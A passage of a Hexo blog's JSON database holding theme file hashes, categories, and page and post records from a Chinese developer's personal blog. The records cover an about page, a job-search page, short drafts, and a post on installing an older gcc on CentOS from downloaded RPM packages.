styl","hash":"f5e6e75958de59e87fc6be3a1668e870e20bc836","modified":1520303845730},{"_id":"themes/cactus/source/css/_highlight/darkula.styl","hash":"9717efa9194837ba3fb4d762997d33075dcf8bfa","modified":1520303845730},{"_id":"themes/cactus/source/css/_highlight/far.styl","hash":"aaac3028f5e33123cd123a583cddc9290c45ec8e","modified":1520303845730},{"_id":"themes/cactus/source/css/_highlight/hopscotch.styl","hash":"1378a6bc67a32c0cbff72ab771268b53f9aa586d","modified":1520303845731},{"_id":"themes/cactus/source/css/_highlight/hybrid.styl","hash":"b8eb5c69d12f2ee5ebc50265ae271699d7f1a8d3","modified":1520303845731},{"_id":"themes/cactus/source/css/_highlight/ir-black.styl","hash":"53e5d74326a4527b92272bbd6946d4fec92720e8","modified":1520303845731},{"_id":"themes/cactus/source/css/_highlight/kimbie.styl","hash":"51b889ca7c6fe178cfbbe28d875a6ea427184441","modified":1520303845732},{"_id":"themes/cactus/source/css/_highlight/monokai-sublime.styl","hash":"c385b11345894be7e6ce3c5f08663e199933b8e4","modified":1520303845732},{"_id":"themes/cactus/source/css/_highlight/monokai.styl","hash":"f87be027848ea6bee623a08ad1e17b2f5b7937ee","modified":1520303845732},{"_id":"themes/cactus/source/css/_highlight/obsidian.styl","hash":"199e28326be8590883f0813ebbd54fcfaa4750fd","modified":1520303845732},{"_id":"themes/cactus/source/css/_highlight/paraiso.styl","hash":"75f181eece6b71d033ea0c8d6cf00ae7efb9e29b","modified":1520303845733},{"_id":"themes/cactus/source/css/_highlight/pojoaque.styl","hash":"e58c62de993b8f7c6c33675cfd1f9b5d3c6d3e57","modified":1520305234086},{"_id":"themes/cactus/source/css/_highlight/railscasts.styl","hash":"b6674db9210e0c4444e4835fff2d1361f3ebd64c","modified":1520303845733},{"_id":"themes/cactus/source/css/_highlight/rainbow.styl","hash":"c0cf97aae3e10fdcd10414547a711c9effbc39b8","modified":1520303845734},{"_id":"themes/cactus/source/css/_highlight/solarized-dark.styl","hash":"90c9da5aa594383697e5b18892a7f95beb053f55","modified":1520303845734},{"_id":"themes/cactus/source/css/_highlight/sunburst.styl","hash":"af3eec0fd56151e55bbd49c31b151f36717611d8","modified":1520303845734},{"_id":"themes/cactus/source/css/_highlight/tomorrow-night-blue.styl","hash":"f24c17d0ab815dcfaab3438cb9fe2ab4839f5e0d","modified":1520303845734},{"_id":"themes/cactus/source/css/_highlight/tomorrow-night-bright.styl","hash":"7674fecb6d27350727dc0d2dc93bc018382ebbd0","modified":1520303845735},{"_id":"themes/cactus/source/css/_highlight/tomorrow-night-eighties.styl","hash":"28d751075ebabf7d0327a36f725076fe82fdf626","modified":1520303845735},{"_id":"themes/cactus/source/css/_highlight/tomorrow-night.styl","hash":"16ba09b2db501e4e3e2e7d62595d9bf935bf27c4","modified":1520303845735},{"_id":"themes/cactus/source/css/_highlight/zenburn.styl","hash":"68ff9332ccc03f9389b15b713415cde016f8088f","modified":1520303845735},{"_id":"themes/cactus/source/css/_partial/archive.styl","hash":"ef8fc52337c4c7b010cad7c427cb78009b30f9d8","modified":1520303845736},{"_id":"themes/cactus/source/css/_partial/article.styl","hash":"21926465b600bcef37444218be4c9cb40115624b","modified":1520303845736},{"_id":"themes/cactus/source/css/_partial/comments.styl","hash":"1e90f1fb9d4c155df518cacb5a537e9de9c042c1","modified":1520303845737},{"_id":"themes/cactus/source/css/_partial/footer.styl","hash":"06ba26c13e6ab64de9d35a4470e543a7510042a7","modified":1520303845737},{"_id":"themes/cactus/source/css/_partial/header.styl","hash":"b1759e578ea285346b6194bbde2defff716a0f81","modified":1520304300178},{"_id":"themes/cactus/source/css/_partial/index.styl","hash":"f0433b721be90c8c42b4876096b02eaf3c08331f","modified":1520303845737},{"_id":"themes/cactus/source/css/_partial/pagination.styl","hash":"950bf517bbe7adb9a9aa4eb5ddec74ffc7598787","modified":1520303845738},{"_id":"themes/cactus/source/css/_partial/search.styl","hash":"159be002780c62a77f46947cf854a7342fba24f4","modified":1520303845739},{"_id":"themes/cactus/.git/objects/pack/pack-951fc75b2410f5d04149318ed9e7b02e67399eb5.idx","hash":"adee455df13834f0f0b05db86027c4b13e3e02dd","modified":1520303845689},{"_id":"themes/cactus/source/images/logo.png","hash":"854857723a37854d62dfea02a620049cf2a16019","modified":1520304177180},{"_id":"themes/cactus/.git/logs/refs/heads/master","hash":"ac513bb1da405940057899c073a33b9ea001371f","modified":1520522029584},{"_id":"themes/cactus/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1520303845706},{"_id":"themes/cactus/.git/refs/remotes/origin/master","hash":"dfd00c66736911e7c62b78b660604d7724754e68","modified":1520309363169},{"_id":"themes/cactus/source/css/_partial/post/actions_desktop.styl","hash":"925a35416b5be7e174146b074482615ee4918fdd","modified":1520304670473},{"_id":"themes/cactus/source/css/_partial/post/actions_mobile.styl","hash":"0d2966c1d870392476864af8ee3ba312ba30cb82","modified":1520303845738},{"_id":"themes/cactus/.git/objects/09/dd67805c1c3b84c303ec746c7eda0dfdfc850b","hash":"3cd9bb4f169118b5102c8ee8878c4b4baf04d16e","modified":1520304457000},{"_id":"themes/cactus/.git/logs/refs/remotes/origin/HEAD","hash":"9d0b3e955e5ee02e3029b1863885997a67cd2e4a","modified":1520303845706},{"_id":"themes/cactus/.git/logs/refs/remotes/origin/master","hash":"778b4be22e750e36a8cf7921c6602708d0016e46","modified":1520309363170},{"_id":"themes/cactus/.git/objects/pack/pack-951fc75b2410f5d04149318ed9e7b02e67399eb5.pack","hash":"250b181d2c6ffdc8acff3099d4b00f152ce7c879","modified":1520305192000},{"_id":"themes/cactus/.git/objects/a8/6dc46e1cb5b15ba004f021e43249d25788663f","hash":"22676cb724664b66f887f60205305fafac7c30d1","modified":1520522029000},{"_id":"themes/cactus/.git/objects/d5/9c2b610d7e182d92cb3bf25328c25ea1132352","hash":"feb262118f6efe87c64b43e48a0a4015b32ebd87","modified":1520522029000},{"_id":"themes/cactus/.git/objects/33/3d7f310f899f293ee9890a204a31a3d17eb2c3","hash":"34178a1f7ac1523d393e174ef09745caf205be37","modified":1520522029000},{"_id":"themes/cactus/.git/objects/dc/1ff9c1c244d9d2af00a2983a930b0e6d656c74","hash":"613da586bab3f023a32b6a85cdef2ae53e5bf4c2","modified":1520522029583},{"_id":"source/_posts/setTimeout-implement-setInterval.md","hash":"577b05ae4ab052b4eede4af60f799417a0099207","modified":1520345572030},{"_id":"source/_posts/webpack4-performance-test.md","hash":"79a5c229177e96e0ba270a98fe592dcc53d3e893","modified":1520355134482}],"Category":[{"name":"未分类","_id":"cjef4yhuf0004lzlmya0hhdwv"},{"name":"linux","_id":"cjef4yhuv000hlzlmcbjye671"},{"name":"sphinx","_id":"cjef4yhv3000qlzlmvkobq8hx"},{"name":"前端","_id":"cjef4yhv7000vlzlmkfbhz92t"},{"name":"骑行","_id":"cjef4yhvd0013lzlmn7dtnbz5"},{"name":"经历","_id":"cjef4yhvh001alzlmo075eiow"},{"name":"php","_id":"cjef4yhvl001flzlm0zm92wj6"},{"name":"Android","_id":"cjef4yhvz001wlzlmx514ai6y"},{"name":"php","parent":"cjef4yhuv000hlzlmcbjye671","_id":"cjef4yhw40023lzlmy2btjiab"},{"name":"html5","_id":"cjef4yhx20030lzlmhoayngjv"}],"Data":[],"Page":[{"title":"关于我","id":9,"date":"2014-03-28T13:11:03.000Z","_content":"\n我的ID一般是joaner，xiaoai.me是我的博客，用来记录我的生活历程。\n\n这个博客我断断续续写了两年多，中间折腾过许多VPS，丢过几次数据。现在博客搭建在Google台湾数据中心（GCE,Asia），速度很不错，国内下载速度甚至能到500K以上。\n\ngithub: https://github.com/joaner","source":"e5-85-b3-e4-ba-8e-e6-88-91/index.md","raw":"---\ntitle: 关于我\nid: 9\ndate: 2014-03-28 21:11:03\n---\n\n我的ID一般是joaner，xiaoai.me是我的博客，用来记录我的生活历程。\n\n这个博客我断断续续写了两年多，中间折腾过许多VPS，丢过几次数据。现在博客搭建在Google台湾数据中心（GCE,Asia），速度很不错，国内下载速度甚至能到500K以上。\n\ngithub: https://github.com/joaner","updated":"2018-03-05T11:32:58.733Z","path":"e5-85-b3-e4-ba-8e-e6-88-91/index.html","comments":1,"layout":"page","_id":"cjef4yhua0001lzlmutntj9vk","content":"<p>我的ID一般是joaner，xiaoai.me是我的博客，用来记录我的生活历程。</p>\n<p>这个博客我断断续续写了两年多，中间折腾过许多VPS，丢过几次数据。现在博客搭建在Google台湾数据中心（GCE,Asia），速度很不错，国内下载速度甚至能到500K以上。</p>\n<p>github: <a href=\"https://github.com/joaner\" target=\"_blank\" rel=\"noopener\">https://github.com/joaner</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>我的ID一般是joaner，xiaoai.me是我的博客，用来记录我的生活历程。</p>\n<p>这个博客我断断续续写了两年多，中间折腾过许多VPS，丢过几次数据。现在博客搭建在Google台湾数据中心（GCE,Asia），速度很不错，国内下载速度甚至能到500K以上。</p>\n<p>github: <a href=\"https://github.com/joaner\" target=\"_blank\" rel=\"noopener\">https://github.com/joaner</a></p>\n"},{"title":"找工作","id":239,"comment":false,"date":"2015-12-10T04:21:42.000Z","_content":"\n我从事PHP方面的工作3年多了，对PHP可以说是烂熟。此外对linux运维，web前端等也很熟悉。\n\n### 我现在的状况\n\n我现在在北京一家创业公司工作，入职快两个月了（2015-10-26入职）。但是在做了段项目后，发现公司的技术氛围很一般，对产品缺少热爱。所以我想离职，但纠结于年底能否找到合适的工作。\n\n### 如果你有这样一份工作\n\n*   技术氛围浓厚\n*   对学历没限制（我没读大学）\n*   能把产品做到极致\n*   最好在北京\n\n### 我有这些技能\n\n*   做过日活数十万的项目，了解性能优化点\n*   对redis的特性很了解\n*   PHP代码符合PSR标准\n*   精通Yii1,Yii2框架\n*   做过大小项目超过二十个\n*   对薪资要求很随意（10K-20K）\n*   擅长并且也喜欢前端的工作\n\n### 我理想的公司\n\n*   蚂蜂窝\n*   美团网\n*   能做出精美产品的公司\n\n如果想详细了解，可以邮件联系我：joaner1206@gmail.com。","source":"e6-89-be-e5-b7-a5-e4-bd-9c/index.md","raw":"---\ntitle: 找工作\nid: 239\ncomment: false\ndate: 2015-12-10 12:21:42\n---\n\n我从事PHP方面的工作3年多了，对PHP可以说是烂熟。此外对linux运维，web前端等也很熟悉。\n\n### 我现在的状况\n\n我现在在北京一家创业公司工作，入职快两个月了（2015-10-26入职）。但是在做了段项目后，发现公司的技术氛围很一般，对产品缺少热爱。所以我想离职，但纠结于年底能否找到合适的工作。\n\n### 如果你有这样一份工作\n\n*   技术氛围浓厚\n*   对学历没限制（我没读大学）\n*   能把产品做到极致\n*   最好在北京\n\n### 我有这些技能\n\n*   做过日活数十万的项目，了解性能优化点\n*   对redis的特性很了解\n*   PHP代码符合PSR标准\n*   精通Yii1,Yii2框架\n*   做过大小项目超过二十个\n*   对薪资要求很随意（10K-20K）\n*   擅长并且也喜欢前端的工作\n\n### 我理想的公司\n\n*   蚂蜂窝\n*   美团网\n*   能做出精美产品的公司\n\n如果想详细了解，可以邮件联系我：joaner1206@gmail.com。","updated":"2018-03-05T11:32:58.733Z","path":"e6-89-be-e5-b7-a5-e4-bd-9c/index.html","comments":1,"layout":"page","_id":"cjef4yhud0003lzlm8o1vsmif","content":"<p>我从事PHP方面的工作3年多了，对PHP可以说是烂熟。此外对linux运维，web前端等也很熟悉。</p>\n<h3 id=\"我现在的状况\"><a href=\"#我现在的状况\" class=\"headerlink\" title=\"我现在的状况\"></a>我现在的状况</h3><p>我现在在北京一家创业公司工作，入职快两个月了（2015-10-26入职）。但是在做了段项目后，发现公司的技术氛围很一般，对产品缺少热爱。所以我想离职，但纠结于年底能否找到合适的工作。</p>\n<h3 id=\"如果你有这样一份工作\"><a href=\"#如果你有这样一份工作\" class=\"headerlink\" title=\"如果你有这样一份工作\"></a>如果你有这样一份工作</h3><ul>\n<li>技术氛围浓厚</li>\n<li>对学历没限制（我没读大学）</li>\n<li>能把产品做到极致</li>\n<li>最好在北京</li>\n</ul>\n<h3 id=\"我有这些技能\"><a href=\"#我有这些技能\" class=\"headerlink\" title=\"我有这些技能\"></a>我有这些技能</h3><ul>\n<li>做过日活数十万的项目，了解性能优化点</li>\n<li>对redis的特性很了解</li>\n<li>PHP代码符合PSR标准</li>\n<li>精通Yii1,Yii2框架</li>\n<li>做过大小项目超过二十个</li>\n<li>对薪资要求很随意（10K-20K）</li>\n<li>擅长并且也喜欢前端的工作</li>\n</ul>\n<h3 id=\"我理想的公司\"><a href=\"#我理想的公司\" class=\"headerlink\" title=\"我理想的公司\"></a>我理想的公司</h3><ul>\n<li>蚂蜂窝</li>\n<li>美团网</li>\n<li>能做出精美产品的公司</li>\n</ul>\n<p>如果想详细了解，可以邮件联系我：<a href=\"mailto:joaner1206@gmail.com\" target=\"_blank\" rel=\"noopener\">joaner1206@gmail.com</a>。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>我从事PHP方面的工作3年多了，对PHP可以说是烂熟。此外对linux运维，web前端等也很熟悉。</p>\n<h3 id=\"我现在的状况\"><a href=\"#我现在的状况\" class=\"headerlink\" title=\"我现在的状况\"></a>我现在的状况</h3><p>我现在在北京一家创业公司工作，入职快两个月了（2015-10-26入职）。但是在做了段项目后，发现公司的技术氛围很一般，对产品缺少热爱。所以我想离职，但纠结于年底能否找到合适的工作。</p>\n<h3 id=\"如果你有这样一份工作\"><a href=\"#如果你有这样一份工作\" class=\"headerlink\" title=\"如果你有这样一份工作\"></a>如果你有这样一份工作</h3><ul>\n<li>技术氛围浓厚</li>\n<li>对学历没限制（我没读大学）</li>\n<li>能把产品做到极致</li>\n<li>最好在北京</li>\n</ul>\n<h3 id=\"我有这些技能\"><a href=\"#我有这些技能\" class=\"headerlink\" title=\"我有这些技能\"></a>我有这些技能</h3><ul>\n<li>做过日活数十万的项目，了解性能优化点</li>\n<li>对redis的特性很了解</li>\n<li>PHP代码符合PSR标准</li>\n<li>精通Yii1,Yii2框架</li>\n<li>做过大小项目超过二十个</li>\n<li>对薪资要求很随意（10K-20K）</li>\n<li>擅长并且也喜欢前端的工作</li>\n</ul>\n<h3 id=\"我理想的公司\"><a href=\"#我理想的公司\" class=\"headerlink\" title=\"我理想的公司\"></a>我理想的公司</h3><ul>\n<li>蚂蜂窝</li>\n<li>美团网</li>\n<li>能做出精美产品的公司</li>\n</ul>\n<p>如果想详细了解，可以邮件联系我：<a href=\"mailto:joaner1206@gmail.com\" target=\"_blank\" rel=\"noopener\">joaner1206@gmail.com</a>。</p>\n"},{"title":"search","date":"2018-03-06T03:57:06.000Z","search":true,"_content":"","source":"search/index.md","raw":"---\ntitle: search\ndate: 2018-03-06 11:57:06\nsearch: true\n---\n","updated":"2018-03-06T04:02:30.902Z","path":"search/index.html","comments":1,"layout":"page","_id":"cjef4yhxw003ilzlmms6vq8fe","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"CSS上下垂直居中复习","id":"337","_content":"","source":"_drafts/CSS上下垂直居中复习.md","raw":"---\ntitle: CSS上下垂直居中复习\nid: 337\ncategories:\n  - 未分类\ntags:\n---\n","slug":"CSS上下垂直居中复习","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhu40000lzlmoi63jirt","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"PHP发送POST请求的方法整理","id":"258","_content":"","source":"_drafts/PHP发送POST请求的方法整理.md","raw":"---\ntitle: PHP发送POST请求的方法整理\nid: 258\ncategories:\n  - 未分类\ntags:\n---\n","slug":"PHP发送POST请求的方法整理","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhub0002lzlm44woc8fj","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"javascript捕获ctrl+C等按键事件","id":"120","_content":"\n按键和鼠标事件对象里，都会附带当前**CTRL**,**SHIFT**等按键的状态．\n\n按键对应的属性列表\n\n*   **altKey  **ALT按键是否按着例如捕获ctrl+C复制事件\n参考文档: https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent","source":"_drafts/javascript捕获ctrl-C等按键事件.md","raw":"---\ntitle: javascript捕获ctrl+C等按键事件\nid: 120\ncategories:\n  - 未分类\ntags:\n---\n\n按键和鼠标事件对象里，都会附带当前**CTRL**,**SHIFT**等按键的状态．\n\n按键对应的属性列表\n\n*   **altKey  **ALT按键是否按着例如捕获ctrl+C复制事件\n参考文档: https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent","slug":"javascript捕获ctrl-C等按键事件","published":0,"date":"2018-03-05T11:32:58.727Z","updated":"2018-03-05T11:32:58.733Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhug0005lzlmuozivf3n","content":"<p>按键和鼠标事件对象里，都会附带当前<strong>CTRL</strong>,<strong>SHIFT</strong>等按键的状态．</p>\n<p>按键对应的属性列表</p>\n<ul>\n<li><strong>altKey  </strong>ALT按键是否按着例如捕获ctrl+C复制事件<br>参考文档: <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>按键和鼠标事件对象里，都会附带当前<strong>CTRL</strong>,<strong>SHIFT</strong>等按键的状态．</p>\n<p>按键对应的属性列表</p>\n<ul>\n<li><strong>altKey  </strong>ALT按键是否按着例如捕获ctrl+C复制事件<br>参考文档: <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent</a></li>\n</ul>\n"},{"title":"leetcode刷题的收获","id":"320","_content":"\n一些疑问：\nhttps://leetcode.com/submissions/detail/135786371/\n\n`Array.pop()`的性能为什么低？","source":"_drafts/leetcode刷题的收获.md","raw":"---\ntitle: leetcode刷题的收获\nid: 320\ncategories:\n  - 未分类\ntags:\n---\n\n一些疑问：\nhttps://leetcode.com/submissions/detail/135786371/\n\n`Array.pop()`的性能为什么低？","slug":"leetcode刷题的收获","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhui0006lzlmsdvn0iw0","content":"<p>一些疑问：<br><a href=\"https://leetcode.com/submissions/detail/135786371/\" target=\"_blank\" rel=\"noopener\">https://leetcode.com/submissions/detail/135786371/</a></p>\n<p><code>Array.pop()</code>的性能为什么低？</p>\n","site":{"data":{}},"excerpt":"","more":"<p>一些疑问：<br><a href=\"https://leetcode.com/submissions/detail/135786371/\" target=\"_blank\" rel=\"noopener\">https://leetcode.com/submissions/detail/135786371/</a></p>\n<p><code>Array.pop()</code>的性能为什么低？</p>\n"},{"title":"恢复sudo命令","id":"153","_content":"\nFedora自带的vi命令不习惯，取消了兼容模式还是有点问题，索性卸载了，结果没注意把sudo也卸载了&gt;_&lt;。\n\n好在su命令还在：\n<pre>[xiaoai@xiaoai snippets]$ su -\n密码：\n[root@xiaoai ~]# yum install sudo</pre>\n下次用yum remove得小心了","source":"_drafts/恢复sudo命令.md","raw":"---\ntitle: 恢复sudo命令\nid: 153\ncategories:\n  - linux\ntags:\n---\n\nFedora自带的vi命令不习惯，取消了兼容模式还是有点问题，索性卸载了，结果没注意把sudo也卸载了&gt;_&lt;。\n\n好在su命令还在：\n<pre>[xiaoai@xiaoai snippets]$ su -\n密码：\n[root@xiaoai ~]# yum install sudo</pre>\n下次用yum remove得小心了","slug":"恢复sudo命令","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhuj0007lzlmfkizc18d","content":"<p>Fedora自带的vi命令不习惯，取消了兼容模式还是有点问题，索性卸载了，结果没注意把sudo也卸载了&gt;_&lt;。</p>\n<p>好在su命令还在：</p>\n<p><pre>[xiaoai@xiaoai snippets]$ su -<br>密码：<br>[root@xiaoai ~]# yum install sudo</pre><br>下次用yum remove得小心了</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Fedora自带的vi命令不习惯，取消了兼容模式还是有点问题，索性卸载了，结果没注意把sudo也卸载了&gt;_&lt;。</p>\n<p>好在su命令还在：</p>\n<p><pre>[xiaoai@xiaoai snippets]$ su -<br>密码：<br>[root@xiaoai ~]# yum install sudo</pre><br>下次用yum remove得小心了</p>\n"},{"title":"支付宝集成的那些坑","id":"256","_content":"","source":"_drafts/支付宝集成的那些坑.md","raw":"---\ntitle: 支付宝集成的那些坑\nid: 256\ncategories:\n  - 未分类\ntags:\n---\n","slug":"支付宝集成的那些坑","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhum0009lzlm18ypy09g","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"[译] 使用preconnect预连接优化网络","id":"343","_content":"\n> 本文翻译自 [https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/](https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/) ，作者是 High performance browser network 作者，在线阅读地址 [https://hpbn.co/](https://hpbn.co/)\n在实际的请求内容到达服务器之前，建立HTTP连接的“简单动作”需要多次往返数据包：浏览器必须先解析DNS地址，执行TCP握手，HTTPS连接还需要协商安全套接字连接。这些初始化连接占用了部分时间，延迟了获取数据。\n\n&nbsp;","source":"_drafts/译-使用preconnect预连接优化网络.md","raw":"---\ntitle: '[译] 使用preconnect预连接优化网络'\nid: 343\ncategories:\n  - 未分类\ntags:\n---\n\n> 本文翻译自 [https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/](https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/) ，作者是 High performance browser network 作者，在线阅读地址 [https://hpbn.co/](https://hpbn.co/)\n在实际的请求内容到达服务器之前，建立HTTP连接的“简单动作”需要多次往返数据包：浏览器必须先解析DNS地址，执行TCP握手，HTTPS连接还需要协商安全套接字连接。这些初始化连接占用了部分时间，延迟了获取数据。\n\n&nbsp;","slug":"译-使用preconnect预连接优化网络","published":0,"date":"2018-03-05T11:32:58.730Z","updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhuo000alzlmb7ku069d","content":"<blockquote>\n<p>本文翻译自 <a href=\"https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/\" target=\"_blank\" rel=\"noopener\">https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/</a> ，作者是 High performance browser network 作者，在线阅读地址 <a href=\"https://hpbn.co/\" target=\"_blank\" rel=\"noopener\">https://hpbn.co/</a><br>在实际的请求内容到达服务器之前，建立HTTP连接的“简单动作”需要多次往返数据包：浏览器必须先解析DNS地址，执行TCP握手，HTTPS连接还需要协商安全套接字连接。这些初始化连接占用了部分时间，延迟了获取数据。</p>\n</blockquote>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>本文翻译自 <a href=\"https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/\" target=\"_blank\" rel=\"noopener\">https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/</a> ，作者是 High performance browser network 作者，在线阅读地址 <a href=\"https://hpbn.co/\" target=\"_blank\" rel=\"noopener\">https://hpbn.co/</a><br>在实际的请求内容到达服务器之前，建立HTTP连接的“简单动作”需要多次往返数据包：浏览器必须先解析DNS地址，执行TCP握手，HTTPS连接还需要协商安全套接字连接。这些初始化连接占用了部分时间，延迟了获取数据。</p>\n</blockquote>\n<p>&nbsp;</p>\n"},{"title":"centos安装旧版本gcc","id":"24","date":"2014-07-10T03:55:19.000Z","_content":"\n编译方式非常麻烦，因此我选择rpm安装。\n\n1\\. 卸载当前的gcc高版本，centos6.5的gcc默认是 4.4.7 ，我要安装 4.1.2\n```\nsudo yum remove cpp\n```\n&nbsp;\n\n2\\. 下载rpm包，一个是 gcc，一个是cpp\n```\nwget ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm\n\nwget ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm\n```\n&nbsp;\n\n3\\. 安装，先安装 cpp\n```\nrpm -ivh cpp-4.1.2-48.el5.x86_64.rpm\n\nrpm -ivh gcc-4.1.2-48.el5.x86_64.rpm\n```\n&nbsp;","source":"_posts/centos-e5-ae-89-e8-a3-85-e6-97-a7-e7-89-88-e6-9c-acgcc.md","raw":"---\ntitle: centos安装旧版本gcc\nid: 24\ncategories:\n  - linux\ndate: 2014-07-10 11:55:19\ntags:\n---\n\n编译方式非常麻烦，因此我选择rpm安装。\n\n1\\. 卸载当前的gcc高版本，centos6.5的gcc默认是 4.4.7 ，我要安装 4.1.2\n```\nsudo yum remove cpp\n```\n&nbsp;\n\n2\\. 下载rpm包，一个是 gcc，一个是cpp\n```\nwget ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm\n\nwget ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm\n```\n&nbsp;\n\n3\\. 安装，先安装 cpp\n```\nrpm -ivh cpp-4.1.2-48.el5.x86_64.rpm\n\nrpm -ivh gcc-4.1.2-48.el5.x86_64.rpm\n```\n&nbsp;","slug":"centos-e5-ae-89-e8-a3-85-e6-97-a7-e7-89-88-e6-9c-acgcc","published":1,"updated":"2018-03-05T12:56:25.365Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhur000dlzlm15kkys2j","content":"<p>编译方式非常麻烦，因此我选择rpm安装。</p>\n<p>1. 卸载当前的gcc高版本，centos6.5的gcc默认是 4.4.7 ，我要安装 4.1.2<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo yum remove cpp</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>2. 下载rpm包，一个是 gcc，一个是cpp<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm</span><br><span class=\"line\"></span><br><span class=\"line\">wget ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>3. 安装，先安装 cpp<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh cpp-4.1.2-48.el5.x86_64.rpm</span><br><span class=\"line\"></span><br><span class=\"line\">rpm -ivh gcc-4.1.2-48.el5.x86_64.rpm</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>编译方式非常麻烦，因此我选择rpm安装。</p>\n<p>1. 卸载当前的gcc高版本，centos6.5的gcc默认是 4.4.7 ，我要安装 4.1.2<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo yum remove cpp</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>2. 下载rpm包，一个是 gcc，一个是cpp<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget ftp://mirror.nl.leaseweb.net/plesk/PSA_9.5.4/update-rpm-CentOS-5-x86_64/cpp-4.1.2-48.el5.x86_64.rpm</span><br><span class=\"line\"></span><br><span class=\"line\">wget ftp://ftp.pbone.net/mirror/ftp.scientificlinux.org/linux/scientific/55/x86_64/SL/gcc-4.1.2-48.el5.x86_64.rpm</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n<p>3. 安装，先安装 cpp<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rpm -ivh cpp-4.1.2-48.el5.x86_64.rpm</span><br><span class=\"line\"></span><br><span class=\"line\">rpm -ivh gcc-4.1.2-48.el5.x86_64.rpm</span><br></pre></td></tr></table></figure></p>\n<p>&nbsp;</p>\n"},{"title":"coreseek中文分词配置","id":"21","date":"2014-06-27T15:46:59.000Z","_content":"\n在安装配置coreseek 3.2.13 中积累了一些问题，在这里记录下来:\n\n### 1\\. 让一些特殊字符也能被检索，比如 +- （加减号）\n\n正常来说修改主配置文件sphinx.conf的 index.charset_table 